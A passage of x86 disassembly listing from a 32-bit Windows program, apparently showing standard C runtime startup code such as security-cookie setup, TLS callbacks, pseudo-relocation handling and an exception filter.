  4028be:	mov    DWORD PTR [esp],eax
  4028c1:	call   0x402cf0
  4028c6:	mov    ds:0x4100a4,eax
  4028cb:	mov    eax,DWORD PTR [esp+0x1c]
  4028cf:	mov    DWORD PTR [esp],eax
  4028d2:	call   0x402cf0
  4028d7:	mov    DWORD PTR [esp],0x8
  4028de:	mov    ds:0x4100a0,eax
  4028e3:	call   0x40acc0
  4028e8:	add    esp,0x28
  4028eb:	mov    eax,ebx
  4028ed:	pop    ebx
  4028ee:	ret    
  4028ef:	nop
  4028f0:	mov    eax,DWORD PTR [esp+0x30]
  4028f4:	mov    DWORD PTR [esp],eax
  4028f7:	call   DWORD PTR ds:0x411354
  4028fd:	add    esp,0x28
  402900:	pop    ebx
  402901:	ret    
  402902:	lea    esi,[esi+eiz*1+0x0]
  402909:	lea    edi,[edi+eiz*1+0x0]
  402910:	sub    esp,0x1c
  402913:	mov    eax,DWORD PTR [esp+0x20]
  402917:	mov    DWORD PTR [esp],eax
  40291a:	call   0x402850
  40291f:	test   eax,eax
  402921:	sete   al
  402924:	add    esp,0x1c
  402927:	movzx  eax,al
  40292a:	neg    eax
  40292c:	ret    
  40292d:	nop
  40292e:	nop
  40292f:	nop
  402930:	mov    eax,ds:0x40c004
  402935:	mov    eax,DWORD PTR [eax]
  402937:	test   eax,eax
  402939:	je     0x40295a
  40293b:	sub    esp,0xc
  40293e:	xchg   ax,ax
  402940:	call   eax
  402942:	mov    eax,ds:0x40c004
  402947:	lea    edx,[eax+0x4]
  40294a:	mov    eax,DWORD PTR [eax+0x4]
  40294d:	mov    DWORD PTR ds:0x40c004,edx
  402953:	test   eax,eax
  402955:	jne    0x402940
  402957:	add    esp,0xc
  40295a:	repz ret 
  40295c:	lea    esi,[esi+eiz*1+0x0]
  402960:	push   ebx
  402961:	sub    esp,0x18
  402964:	mov    ebx,DWORD PTR ds:0x40b2f0
  40296a:	cmp    ebx,0xffffffff
  40296d:	je     0x402990
  40296f:	test   ebx,ebx
  402971:	je     0x40297f
  402973:	call   DWORD PTR [ebx*4+0x40b2f0]
  40297a:	sub    ebx,0x1
  40297d:	jne    0x402973
  40297f:	mov    DWORD PTR [esp],0x402930
  402986:	call   0x402910
  40298b:	add    esp,0x18
  40298e:	pop    ebx
  40298f:	ret    
  402990:	xor    ebx,ebx
  402992:	jmp    0x402996
  402994:	mov    ebx,eax
  402996:	lea    eax,[ebx+0x1]
  402999:	mov    edx,DWORD PTR [eax*4+0x40b2f0]
  4029a0:	test   edx,edx
  4029a2:	jne    0x402994
  4029a4:	jmp    0x40296f
  4029a6:	lea    esi,[esi+0x0]
  4029a9:	lea    edi,[edi+eiz*1+0x0]
  4029b0:	mov    eax,ds:0x40f280
  4029b5:	test   eax,eax
  4029b7:	je     0x4029c0
  4029b9:	repz ret 
  4029bb:	nop
  4029bc:	lea    esi,[esi+eiz*1+0x0]
  4029c0:	mov    DWORD PTR ds:0x40f280,0x1
  4029ca:	jmp    0x402960
  4029cc:	nop
  4029cd:	nop
  4029ce:	nop
  4029cf:	nop
  4029d0:	mov    eax,ds:0x411324
  4029d5:	jmp    eax
  4029d7:	nop
  4029d8:	nop
  4029d9:	nop
  4029da:	nop
  4029db:	nop
  4029dc:	nop
  4029dd:	nop
  4029de:	nop
  4029df:	nop
  4029e0:	xor    eax,eax
  4029e2:	ret    
  4029e3:	nop
  4029e4:	nop
  4029e5:	nop
  4029e6:	nop
  4029e7:	nop
  4029e8:	nop
  4029e9:	nop
  4029ea:	nop
  4029eb:	nop
  4029ec:	nop
  4029ed:	nop
  4029ee:	nop
  4029ef:	nop
  4029f0:	push   ebp
  4029f1:	push   edi
  4029f2:	push   esi
  4029f3:	push   ebx
  4029f4:	sub    esp,0x2c
  4029f7:	mov    eax,ds:0x40c064
  4029fc:	mov    DWORD PTR [esp+0x10],0x0
  402a04:	mov    DWORD PTR [esp+0x14],0x0
  402a0c:	cmp    eax,0xbb40e64e
  402a11:	je     0x402a22
  402a13:	not    eax
  402a15:	mov    ds:0x40c068,eax
  402a1a:	add    esp,0x2c
  402a1d:	pop    ebx
  402a1e:	pop    esi
  402a1f:	pop    edi
  402a20:	pop    ebp
  402a21:	ret    
  402a22:	lea    eax,[esp+0x10]
  402a26:	mov    DWORD PTR [esp],eax
  402a29:	call   DWORD PTR ds:0x4112b8
  402a2f:	sub    esp,0x4
  402a32:	mov    ebx,DWORD PTR [esp+0x10]
  402a36:	xor    ebx,DWORD PTR [esp+0x14]
  402a3a:	call   DWORD PTR ds:0x411294
  402a40:	mov    ebp,eax
  402a42:	call   DWORD PTR ds:0x411298
  402a48:	mov    edi,eax
  402a4a:	call   DWORD PTR ds:0x4112bc
  402a50:	mov    esi,eax
  402a52:	lea    eax,[esp+0x18]
  402a56:	mov    DWORD PTR [esp],eax
  402a59:	call   DWORD PTR ds:0x4112ec
  402a5f:	sub    esp,0x4
  402a62:	xor    ebx,DWORD PTR [esp+0x18]
  402a66:	xor    ebx,DWORD PTR [esp+0x1c]
  402a6a:	xor    ebx,ebp
  402a6c:	xor    edi,ebx
  402a6e:	xor    esi,edi
  402a70:	cmp    esi,0xbb40e64e
  402a76:	je     0x402a90
  402a78:	mov    eax,esi
  402a7a:	not    eax
  402a7c:	mov    DWORD PTR ds:0x40c064,esi
  402a82:	mov    ds:0x40c068,eax
  402a87:	add    esp,0x2c
  402a8a:	pop    ebx
  402a8b:	pop    esi
  402a8c:	pop    edi
  402a8d:	pop    ebp
  402a8e:	ret    
  402a8f:	nop
  402a90:	mov    eax,0x44bf19b0
  402a95:	mov    esi,0xbb40e64f
  402a9a:	jmp    0x402a7c
  402a9c:	lea    esi,[esi+eiz*1+0x0]
  402aa0:	push   ebp
  402aa1:	mov    ebp,esp
  402aa3:	sub    esp,0x28
  402aa6:	mov    DWORD PTR ds:0x40f5c0,0xc0000409
  402ab0:	mov    eax,DWORD PTR [ebp+0x4]
  402ab3:	lea    edx,[ebp+0x4]
  402ab6:	mov    DWORD PTR ds:0x40f5c4,0x1
  402ac0:	mov    DWORD PTR [esp],0x0
  402ac7:	mov    DWORD PTR ds:0x40f384,edx
  402acd:	mov    ds:0x40f378,eax
  402ad2:	mov    ds:0x40f5cc,eax
  402ad7:	mov    eax,DWORD PTR [ebp+0x8]
  402ada:	mov    ds:0x40f36c,eax
  402adf:	mov    eax,ds:0x40c064
  402ae4:	mov    DWORD PTR [ebp-0x10],eax
  402ae7:	mov    eax,ds:0x40c068
  402aec:	mov    DWORD PTR [ebp-0xc],eax
  402aef:	call   DWORD PTR ds:0x4112f4
  402af5:	sub    esp,0x4
  402af8:	mov    DWORD PTR [esp],0x40da70
  402aff:	call   DWORD PTR ds:0x411304
  402b05:	sub    esp,0x4
  402b08:	call   DWORD PTR ds:0x411290
  402b0e:	mov    DWORD PTR [esp+0x4],0xc0000409
  402b16:	mov    DWORD PTR [esp],eax
  402b19:	call   DWORD PTR ds:0x4112fc
  402b1f:	sub    esp,0x8
  402b22:	call   0x40acb8
  402b27:	nop
  402b28:	nop
  402b29:	nop
  402b2a:	nop
  402b2b:	nop
  402b2c:	nop
  402b2d:	nop
  402b2e:	nop
  402b2f:	nop
  402b30:	sub    esp,0x1c
  402b33:	mov    eax,DWORD PTR [esp+0x24]
  402b37:	test   eax,eax
  402b39:	je     0x402b50
  402b3b:	cmp    eax,0x3
  402b3e:	je     0x402b50
  402b40:	mov    eax,0x1
  402b45:	add    esp,0x1c
  402b48:	ret    0xc
  402b4b:	nop
  402b4c:	lea    esi,[esi+eiz*1+0x0]
  402b50:	mov    edx,DWORD PTR [esp+0x28]
  402b54:	mov    DWORD PTR [esp+0x4],eax
  402b58:	mov    eax,DWORD PTR [esp+0x20]
  402b5c:	mov    DWORD PTR [esp+0x8],edx
  402b60:	mov    DWORD PTR [esp],eax
  402b63:	call   0x4035b0
  402b68:	mov    eax,0x1
  402b6d:	add    esp,0x1c
  402b70:	ret    0xc
  402b73:	lea    esi,[esi+0x0]
  402b79:	lea    edi,[edi+eiz*1+0x0]
  402b80:	push   ebx
  402b81:	sub    esp,0x18
  402b84:	cmp    DWORD PTR ds:0x40c014,0x2
  402b8b:	mov    eax,DWORD PTR [esp+0x24]
  402b8f:	je     0x402b9b
  402b91:	mov    DWORD PTR ds:0x40c014,0x2
  402b9b:	cmp    eax,0x2
  402b9e:	je     0x402bb1
  402ba0:	cmp    eax,0x1
  402ba3:	je     0x402be0
  402ba5:	add    esp,0x18
  402ba8:	mov    eax,0x1
  402bad:	pop    ebx
  402bae:	ret    0xc
  402bb1:	mov    ebx,0x412030
  402bb6:	cmp    ebx,0x412030
  402bbc:	je     0x402ba5
  402bbe:	xchg   ax,ax
  402bc0:	mov    eax,DWORD PTR [ebx]
  402bc2:	test   eax,eax
  402bc4:	je     0x402bc8
  402bc6:	call   eax
  402bc8:	add    ebx,0x4
  402bcb:	cmp    ebx,0x412030
  402bd1:	jne    0x402bc0
  402bd3:	add    esp,0x18
  402bd6:	mov    eax,0x1
  402bdb:	pop    ebx
  402bdc:	ret    0xc
  402bdf:	nop
  402be0:	mov    eax,DWORD PTR [esp+0x28]
  402be4:	mov    DWORD PTR [esp+0x4],0x1
  402bec:	mov    DWORD PTR [esp+0x8],eax
  402bf0:	mov    eax,DWORD PTR [esp+0x20]
  402bf4:	mov    DWORD PTR [esp],eax
  402bf7:	call   0x4035b0
  402bfc:	jmp    0x402ba5
  402bfe:	xchg   ax,ax
  402c00:	xor    eax,eax
  402c02:	ret    
  402c03:	nop
  402c04:	nop
  402c05:	nop
  402c06:	nop
  402c07:	nop
  402c08:	nop
  402c09:	nop
  402c0a:	nop
  402c0b:	nop
  402c0c:	nop
  402c0d:	nop
  402c0e:	nop
  402c0f:	nop
  402c10:	sub    esp,0x3c
  402c13:	mov    eax,ds:0x40f654
  402c18:	fld    QWORD PTR [esp+0x48]
  402c1c:	fld    QWORD PTR [esp+0x50]
  402c20:	test   eax,eax
  402c22:	fld    QWORD PTR [esp+0x58]
  402c26:	je     0x402c51
  402c28:	fxch   st(2)
  402c2a:	mov    edx,DWORD PTR [esp+0x40]
  402c2e:	fstp   QWORD PTR [esp+0x18]
  402c32:	fstp   QWORD PTR [esp+0x20]
  402c36:	mov    DWORD PTR [esp+0x10],edx
  402c3a:	mov    edx,DWORD PTR [esp+0x44]
  402c3e:	fstp   QWORD PTR [esp+0x28]
  402c42:	mov    DWORD PTR [esp+0x14],edx
  402c46:	lea    edx,[esp+0x10]
  402c4a:	mov    DWORD PTR [esp],edx
  402c4d:	call   eax
  402c4f:	jmp    0x402c57
  402c51:	fstp   st(0)
  402c53:	fstp   st(0)
  402c55:	fstp   st(0)
  402c57:	add    esp,0x3c
  402c5a:	ret    
  402c5b:	nop
  402c5c:	lea    esi,[esi+eiz*1+0x0]
  402c60:	mov    eax,DWORD PTR [esp+0x4]
  402c64:	mov    ds:0x40f654,eax
  402c69:	jmp    0x40ad78
  402c6e:	xchg   ax,ax
  402c70:	sub    esp,0x3c
  402c73:	mov    ecx,0x40da7c
  402c78:	mov    eax,DWORD PTR [esp+0x40]
  402c7c:	mov    edx,DWORD PTR [eax]
  402c7e:	sub    edx,0x1
  402c81:	cmp    edx,0x5
  402c84:	ja     0x402c8d
  402c86:	mov    ecx,DWORD PTR [edx*4+0x40db98]
  402c8d:	fld    QWORD PTR [eax+0x18]
  402c90:	fstp   QWORD PTR [esp+0x20]
  402c94:	fld    QWORD PTR [eax+0x10]
  402c97:	fstp   QWORD PTR [esp+0x18]
  402c9b:	fld    QWORD PTR [eax+0x8]
  402c9e:	fstp   QWORD PTR [esp+0x10]
  402ca2:	mov    eax,DWORD PTR [eax+0x4]
  402ca5:	mov    DWORD PTR [esp+0x8],ecx
  402ca9:	mov    DWORD PTR [esp+0x4],0x40da8c
  402cb1:	mov    DWORD PTR [esp+0xc],eax
  402cb5:	mov    eax,ds:0x41134c
  402cba:	add    eax,0x40
  402cbd:	mov    DWORD PTR [esp],eax
  402cc0:	call   0x40ad28
  402cc5:	xor    eax,eax
  402cc7:	add    esp,0x3c
  402cca:	ret    
  402ccb:	nop
  402ccc:	nop
  402ccd:	nop
  402cce:	nop
  402ccf:	nop
  402cd0:	fninit 
  402cd2:	ret    
  402cd3:	nop
  402cd4:	nop
  402cd5:	nop
  402cd6:	nop
  402cd7:	nop
  402cd8:	nop
  402cd9:	nop
  402cda:	nop
  402cdb:	nop
  402cdc:	nop
  402cdd:	nop
  402cde:	nop
  402cdf:	nop
  402ce0:	mov    eax,DWORD PTR [esp+0x4]
  402ce4:	ret    
  402ce5:	lea    esi,[esi+eiz*1+0x0]
  402ce9:	lea    edi,[edi+eiz*1+0x0]
  402cf0:	mov    eax,DWORD PTR [esp+0x4]
  402cf4:	ret    
  402cf5:	nop
  402cf6:	nop
  402cf7:	nop
  402cf8:	nop
  402cf9:	nop
  402cfa:	nop
  402cfb:	nop
  402cfc:	nop
  402cfd:	nop
  402cfe:	nop
  402cff:	nop
  402d00:	push   ebx
  402d01:	sub    esp,0x18
  402d04:	mov    eax,ds:0x41134c
  402d09:	mov    DWORD PTR [esp+0x8],0x1b
  402d11:	mov    DWORD PTR [esp+0x4],0x1
  402d19:	lea    ebx,[esp+0x24]
  402d1d:	mov    DWORD PTR [esp],0x40dbb0
  402d24:	add    eax,0x40
  402d27:	mov    DWORD PTR [esp+0xc],eax
  402d2b:	call   0x40ad08
  402d30:	mov    eax,DWORD PTR [esp+0x20]
  402d34:	mov    DWORD PTR [esp+0x8],ebx
  402d38:	mov    DWORD PTR [esp+0x4],eax
  402d3c:	mov    eax,ds:0x41134c
  402d41:	add    eax,0x40
  402d44:	mov    DWORD PTR [esp],eax
  402d47:	call   0x40acb0
  402d4c:	call   0x40acb8
  402d51:	jmp    0x402d60
  402d53:	nop
  402d54:	nop
  402d55:	nop
  402d56:	nop
  402d57:	nop
  402d58:	nop
  402d59:	nop
  402d5a:	nop
  402d5b:	nop
  402d5c:	nop
  402d5d:	nop
  402d5e:	nop
  402d5f:	nop
  402d60:	push   ebp
  402d61:	push   edi
  402d62:	push   esi
  402d63:	push   ebx
  402d64:	mov    esi,eax
  402d66:	sub    esp,0x4c
  402d69:	mov    ebp,DWORD PTR ds:0x40f660
  402d6f:	mov    DWORD PTR [esp+0x14],edx
  402d73:	mov    DWORD PTR [esp+0x18],ecx
  402d77:	test   ebp,ebp
  402d79:	jle    0x402f60
  402d7f:	mov    eax,ds:0x40f664
  402d84:	lea    edx,[eax+0x4]
  402d87:	xor    eax,eax
  402d89:	lea    esi,[esi+eiz*1+0x0]
  402d90:	mov    ecx,DWORD PTR [edx]
  402d92:	cmp    esi,ecx
  402d94:	jb     0x402da4
  402d96:	mov    ebx,DWORD PTR [edx+0x4]
  402d99:	add    ecx,DWORD PTR [ebx+0x8]
  402d9c:	cmp    esi,ecx
  402d9e:	jb     0x402f00
  402da4:	add    eax,0x1
  402da7:	add    edx,0xc
  402daa:	cmp    eax,ebp
  402dac:	jne    0x402d90
  402dae:	mov    DWORD PTR [esp],esi
  402db1:	call   0x403770
  402db6:	test   eax,eax
  402db8:	mov    edi,eax
  402dba:	je     0x402f87
  402dc0:	lea    ebx,[ebp+ebp*2+0x0]
  402dc4:	mov    ebp,DWORD PTR ds:0x40f664
  402dca:	shl    ebx,0x2
  402dcd:	add    ebp,ebx
  402dcf:	mov    DWORD PTR [ebp+0x8],eax
  402dd2:	mov    DWORD PTR [ebp+0x0],0x0
  402dd9:	call   0x403870
  402dde:	add    eax,DWORD PTR [edi+0xc]
  402de1:	lea    ecx,[esp+0x24]
  402de5:	mov    DWORD PTR [esp+0x1c],ecx
  402de9:	mov    DWORD PTR [ebp+0x4],eax
  402dec:	mov    eax,ds:0x40f664
  402df1:	mov    DWORD PTR [esp+0x4],ecx
  402df5:	mov    DWORD PTR [esp+0x8],0x1c
  402dfd:	mov    ebp,DWORD PTR ds:0x41130c
  402e03:	mov    eax,DWORD PTR [eax+ebx*1+0x4]
  402e07:	mov    DWORD PTR [esp],eax
  402e0a:	call   ebp
  402e0c:	sub    esp,0xc
  402e0f:	test   eax,eax
  402e11:	mov    ecx,DWORD PTR [esp+0x1c]
  402e15:	je     0x402f67
  402e1b:	mov    eax,DWORD PTR [esp+0x38]
  402e1f:	cmp    eax,0x4
  402e22:	je     0x402e2d
  402e24:	cmp    eax,0x40
  402e27:	jne    0x402f10
  402e2d:	add    DWORD PTR ds:0x40f660,0x1
  402e34:	mov    DWORD PTR [esp+0x8],0x1c
  402e3c:	mov    DWORD PTR [esp+0x4],ecx
  402e40:	mov    DWORD PTR [esp],esi
  402e43:	call   ebp
  402e45:	sub    esp,0xc
  402e48:	test   eax,eax
  402e4a:	je     0x402f97
  402e50:	mov    eax,DWORD PTR [esp+0x38]
  402e54:	cmp    eax,0x4
  402e57:	je     0x402e5e
  402e59:	cmp    eax,0x40
  402e5c:	jne    0x402e80
  402e5e:	mov    eax,DWORD PTR [esp+0x18]
  402e62:	mov    DWORD PTR [esp],esi
  402e65:	mov    DWORD PTR [esp+0x8],eax
  402e69:	mov    eax,DWORD PTR [esp+0x14]
  402e6d:	mov    DWORD PTR [esp+0x4],eax
  402e71:	call   0x40ace8
  402e76:	add    esp,0x4c
  402e79:	pop    ebx
  402e7a:	pop    esi
  402e7b:	pop    edi
  402e7c:	pop    ebp
  402e7d:	ret    
  402e7e:	xchg   ax,ax
  402e80:	mov    eax,DWORD PTR [esp+0x30]
  402e84:	lea    ebp,[esp+0x20]
  402e88:	mov    DWORD PTR [esp+0x8],0x40
  402e90:	mov    ebx,DWORD PTR ds:0x411308
  402e96:	mov    DWORD PTR [esp+0xc],ebp
  402e9a:	mov    DWORD PTR [esp+0x4],eax
  402e9e:	mov    eax,DWORD PTR [esp+0x24]
  402ea2:	mov    DWORD PTR [esp],eax
  402ea5:	call   ebx
  402ea7:	sub    esp,0x10
  402eaa:	mov    eax,DWORD PTR [esp+0x18]
  402eae:	mov    DWORD PTR [esp],esi
  402eb1:	mov    DWORD PTR [esp+0x8],eax
  402eb5:	mov    eax,DWORD PTR [esp+0x14]
  402eb9:	mov    DWORD PTR [esp+0x4],eax
  402ebd:	call   0x40ace8
  402ec2:	mov    eax,DWORD PTR [esp+0x38]
  402ec6:	cmp    eax,0x40
  402ec9:	je     0x402e76
  402ecb:	cmp    eax,0x4
  402ece:	je     0x402e76
  402ed0:	mov    eax,DWORD PTR [esp+0x20]
  402ed4:	mov    DWORD PTR [esp+0xc],ebp
  402ed8:	mov    DWORD PTR [esp+0x8],eax
  402edc:	mov    eax,DWORD PTR [esp+0x30]
  402ee0:	mov    DWORD PTR [esp+0x4],eax
  402ee4:	mov    eax,DWORD PTR [esp+0x24]
  402ee8:	mov    DWORD PTR [esp],eax
  402eeb:	call   ebx
  402eed:	sub    esp,0x10
  402ef0:	add    esp,0x4c
  402ef3:	pop    ebx
  402ef4:	pop    esi
  402ef5:	pop    edi
  402ef6:	pop    ebp
  402ef7:	ret    
  402ef8:	nop
  402ef9:	lea    esi,[esi+eiz*1+0x0]
  402f00:	lea    ecx,[esp+0x24]
  402f04:	mov    ebp,DWORD PTR ds:0x41130c
  402f0a:	jmp    0x402e34
  402f0f:	nop
  402f10:	mov    eax,DWORD PTR [esp+0x30]
  402f14:	add    ebx,DWORD PTR ds:0x40f664
  402f1a:	mov    DWORD PTR [esp+0x1c],ecx
  402f1e:	mov    DWORD PTR [esp+0x8],0x40
  402f26:	mov    DWORD PTR [esp+0x4],eax
  402f2a:	mov    eax,DWORD PTR [esp+0x24]
  402f2e:	mov    DWORD PTR [esp+0xc],ebx
  402f32:	mov    DWORD PTR [esp],eax
  402f35:	call   DWORD PTR ds:0x411308
  402f3b:	sub    esp,0x10
  402f3e:	test   eax,eax
  402f40:	mov    ecx,DWORD PTR [esp+0x1c]
  402f44:	jne    0x402e2d
  402f4a:	call   DWORD PTR ds:0x41129c
  402f50:	mov    DWORD PTR [esp],0x40dc20
  402f57:	mov    DWORD PTR [esp+0x4],eax
  402f5b:	call   0x402d00
  402f60:	xor    ebp,ebp
  402f62:	jmp    0x402dae
  402f67:	mov    eax,ds:0x40f664
  402f6c:	mov    eax,DWORD PTR [eax+ebx*1+0x4]
  402f70:	mov    DWORD PTR [esp+0x8],eax
  402f74:	mov    eax,DWORD PTR [edi+0x8]
  402f77:	mov    DWORD PTR [esp],0x40dbec
  402f7e:	mov    DWORD PTR [esp+0x4],eax
  402f82:	call   0x402d00
  402f87:	mov    DWORD PTR [esp+0x4],esi
  402f8b:	mov    DWORD PTR [esp],0x40dbcc
  402f92:	call   0x402d00
  402f97:	mov    DWORD PTR [esp+0x8],esi
  402f9b:	mov    DWORD PTR [esp+0x4],0x1c
  402fa3:	mov    DWORD PTR [esp],0x40dbec
  402faa:	call   0x402d00
  402faf:	nop
  402fb0:	mov    eax,ds:0x40f65c
  402fb5:	test   eax,eax
  402fb7:	je     0x402fc0
  402fb9:	ret    
  402fba:	lea    esi,[esi+0x0]
  402fc0:	push   ebp
  402fc1:	mov    ebp,esp
  402fc3:	push   edi
  402fc4:	push   esi
  402fc5:	push   ebx
  402fc6:	sub    esp,0x4c
  402fc9:	mov    DWORD PTR ds:0x40f65c,0x1
  402fd3:	call   0x4037c0
  402fd8:	lea    eax,[eax+eax*2]
  402fdb:	lea    eax,[eax*4+0x1e]
  402fe2:	and    eax,0xfffffff0
  402fe5:	call   0x4039a0
  402fea:	mov    DWORD PTR ds:0x40f660,0x0
  402ff4:	sub    esp,eax
  402ff6:	lea    eax,[esp+0x1f]
  402ffa:	and    eax,0xfffffff0
  402ffd:	mov    ds:0x40f664,eax
  403002:	mov    eax,0x40e5e4
  403007:	sub    eax,0x40e5e4
  40300c:	cmp    eax,0x7
  40300f:	jle    0x4030b0
  403015:	cmp    eax,0xb
  403018:	jle    0x403183
  40301e:	mov    eax,ds:0x40e5e4
  403023:	test   eax,eax
  403025:	jne    0x4030b8
  40302b:	mov    eax,ds:0x40e5e8
  403030:	test   eax,eax
  403032:	jne    0x4030b8
  403038:	mov    edi,DWORD PTR ds:0x40e5ec
  40303e:	mov    ebx,0x40e5f0
  403043:	test   edi,edi
  403045:	je     0x403188
  40304b:	mov    ebx,0x40e5e4
  403050:	mov    eax,DWORD PTR [ebx+0x8]
  403053:	cmp    eax,0x1
  403056:	jne    0x403264
  40305c:	add    ebx,0xc
  40305f:	cmp    ebx,0x40e5e4
  403065:	jae    0x4030b0
  403067:	movzx  edx,BYTE PTR [ebx+0x8]
  40306b:	mov    edi,DWORD PTR [ebx+0x4]
  40306e:	mov    ecx,DWORD PTR [ebx]
  403070:	lea    eax,[edi+0x400000]
  403076:	cmp    edx,0x10
  403079:	mov    esi,DWORD PTR [ecx+0x400000]
  40307f:	je     0x4031a2
  403085:	cmp    edx,0x20
  403088:	je     0x40321e
  40308e:	cmp    edx,0x8
  403091:	je     0x4031ee
  403097:	mov    DWORD PTR [esp+0x4],edx
  40309b:	mov    DWORD PTR [esp],0x40dc7c
  4030a2:	mov    DWORD PTR [ebp-0x34],0x0
  4030a9:	call   0x402d00
  4030ae:	xchg   ax,ax
  4030b0:	lea    esp,[ebp-0xc]
  4030b3:	pop    ebx
  4030b4:	pop    esi
  4030b5:	pop    edi
  4030b6:	pop    ebp
  4030b7:	ret    
  4030b8:	mov    ebx,0x40e5e4
  4030bd:	cmp    ebx,0x40e5e4
  4030c3:	jae    0x4030b0
  4030c5:	lea    eax,[ebp-0x34]
  4030c8:	mov    DWORD PTR [ebp-0x3c],eax
  4030cb:	nop
  4030cc:	lea    esi,[esi+eiz*1+0x0]
  4030d0:	mov    ecx,DWORD PTR [ebx+0x4]
  4030d3:	mov    edx,DWORD PTR [ebx]
  4030d5:	add    ebx,0x8
  4030d8:	add    edx,DWORD PTR [ecx+0x400000]
  4030de:	lea    eax,[ecx+0x400000]
  4030e4:	mov    ecx,0x4
  4030e9:	mov    DWORD PTR [ebp-0x34],edx
  4030ec:	mov    edx,DWORD PTR [ebp-0x3c]
  4030ef:	call   0x402d60
  4030f4:	cmp    ebx,0x40e5e4
  4030fa:	jb     0x4030d0
  4030fc:	mov    eax,ds:0x40f660
  403101:	xor    ebx,ebx
  403103:	test   eax,eax
  403105:	jg     0x40311b
  403107:	jmp    0x4030b0
  403109:	lea    esi,[esi+eiz*1+0x0]
  403110:	add    ebx,0x1
  403113:	cmp    ebx,DWORD PTR ds:0x40f660
  403119:	jge    0x4030b0
  40311b:	lea    esi,[ebx+ebx*2]
  40311e:	mov    eax,ds:0x40f664
  403123:	lea    edi,[esi*4+0x0]
  40312a:	add    eax,edi
  40312c:	mov    edx,DWORD PTR [eax]
  40312e:	test   edx,edx
  403130:	je     0x403110
  403132:	mov    ecx,DWORD PTR [ebp-0x3c]
  403135:	mov    DWORD PTR [esp+0x8],0x1c
  40313d:	mov    DWORD PTR [esp+0x4],ecx
  403141:	mov    eax,DWORD PTR [eax+0x4]
  403144:	mov    DWORD PTR [esp],eax
  403147:	call   DWORD PTR ds:0x41130c
  40314d:	sub    esp,0xc
  403150:	test   eax,eax
  403152:	je     0x40323f
  403158:	lea    eax,[ebp-0x38]
  40315b:	mov    DWORD PTR [esp+0xc],eax
  40315f:	mov    eax,ds:0x40f664
  403164:	mov    eax,DWORD PTR [eax+esi*4]
  403167:	mov    DWORD PTR [esp+0x8],eax
  40316b:	mov    eax,DWORD PTR [ebp-0x28]
  40316e:	mov    DWORD PTR [esp+0x4],eax
  403172:	mov    eax,DWORD PTR [ebp-0x34]
  403175:	mov    DWORD PTR [esp],eax
  403178:	call   DWORD PTR ds:0x411308
  40317e:	sub    esp,0x10
  403181:	jmp    0x403110
  403183:	mov    ebx,0x40e5e4
  403188:	mov    esi,DWORD PTR [ebx]
  40318a:	test   esi,esi
  40318c:	jne    0x4030bd
  403192:	mov    ecx,DWORD PTR [ebx+0x4]
  403195:	test   ecx,ecx
  403197:	je     0x403050
  40319d:	jmp    0x4030bd
  4031a2:	movzx  edx,WORD PTR [edi+0x400000]
  4031a9:	mov    edi,edx
  4031ab:	mov    WORD PTR [ebp-0x3c],dx
  4031af:	or     edi,0xffff0000
  4031b5:	cmp    WORD PTR [ebp-0x3c],0x0
  4031ba:	cmovs  edx,edi
  4031bd:	sub    edx,0x400000
  4031c3:	sub    edx,ecx
  4031c5:	mov    ecx,0x2
  4031ca:	add    esi,edx
  4031cc:	lea    edx,[ebp-0x34]
  4031cf:	mov    DWORD PTR [ebp-0x34],esi
  4031d2:	mov    DWORD PTR [ebp-0x3c],edx
  4031d5:	call   0x402d60
  4031da:	add    ebx,0xc
  4031dd:	cmp    ebx,0x40e5e4
  4031e3:	jb     0x403067
  4031e9:	jmp    0x4030fc
  4031ee:	movzx  edx,BYTE PTR [eax]
  4031f1:	mov    edi,edx
  4031f3:	or     edi,0xffffff00
  4031f9:	cmp    BYTE PTR [eax],0x0
  4031fc:	cmovs  edx,edi
  4031ff:	sub    edx,0x400000
  403205:	sub    edx,ecx
  403207:	mov    ecx,0x1
  40320c:	add    esi,edx
  40320e:	lea    edx,[ebp-0x34]
  403211:	mov    DWORD PTR [ebp-0x34],esi
  403214:	mov    DWORD PTR [ebp-0x3c],edx
  403217:	call   0x402d60
  40321c:	jmp    0x4031da
  40321e:	mov    edx,DWORD PTR [eax]
  403220:	mov    ecx,0x4
  403225:	sub    edx,0x400000
  40322b:	sub    edx,DWORD PTR [ebx]
  40322d:	add    esi,edx
  40322f:	lea    edx,[ebp-0x34]
  403232:	mov    DWORD PTR [ebp-0x34],esi
  403235:	mov    DWORD PTR [ebp-0x3c],edx
  403238:	call   0x402d60
  40323d:	jmp    0x4031da
  40323f:	mov    ecx,DWORD PTR ds:0x40f664
  403245:	add    ecx,edi
  403247:	mov    eax,DWORD PTR [ecx+0x4]
  40324a:	mov    DWORD PTR [esp+0x8],eax
  40324e:	mov    eax,DWORD PTR [ecx+0x8]
  403251:	mov    eax,DWORD PTR [eax+0x8]
  403254:	mov    DWORD PTR [esp],0x40dbec
  40325b:	mov    DWORD PTR [esp+0x4],eax
  40325f:	call   0x402d00
  403264:	mov    DWORD PTR [esp+0x4],eax
  403268:	mov    DWORD PTR [esp],0x40dc48
  40326f:	call   0x402d00
  403274:	nop
  403275:	nop
  403276:	nop
  403277:	nop
  403278:	nop
  403279:	nop
  40327a:	nop
  40327b:	nop
  40327c:	nop
  40327d:	nop
  40327e:	nop
  40327f:	nop
  403280:	push   ebp
  403281:	mov    ebp,esp
  403283:	push   ebx
  403284:	sub    esp,0x14
  403287:	mov    ebx,DWORD PTR [ebp+0x8]
  40328a:	mov    eax,DWORD PTR [ebx]
  40328c:	mov    eax,DWORD PTR [eax]
  40328e:	cmp    eax,0xc0000091
  403293:	ja     0x4032e0
  403295:	cmp    eax,0xc000008d
  40329a:	jae    0x403350
  4032a0:	cmp    eax,0xc0000005
  4032a5:	jne    0x403384
  4032ab:	mov    DWORD PTR [esp+0x4],0x0
  4032b3:	mov    DWORD PTR [esp],0xb
  4032ba:	call   0x40ace0
  4032bf:	cmp    eax,0x1
  4032c2:	je     0x4033e0
  4032c8:	test   eax,eax
  4032ca:	je     0x4032f9
  4032cc:	mov    DWORD PTR [esp],0xb
  4032d3:	call   eax
  4032d5:	jmp    0x40333a
  4032d7:	mov    esi,esi
  4032d9:	lea    edi,[edi+eiz*1+0x0]
  4032e0:	cmp    eax,0xc0000094
  4032e5:	je     0x403310
  4032e7:	cmp    eax,0xc0000096
  4032ec:	je     0x40338f
  4032f2:	cmp    eax,0xc0000093
  4032f7:	je     0x403350
  4032f9:	mov    eax,ds:0x40f66c
  4032fe:	test   eax,eax
  403300:	je     0x40333f
  403302:	mov    DWORD PTR [ebp+0x8],ebx
  403305:	mov    ebx,DWORD PTR [ebp-0x4]
  403308:	leave  
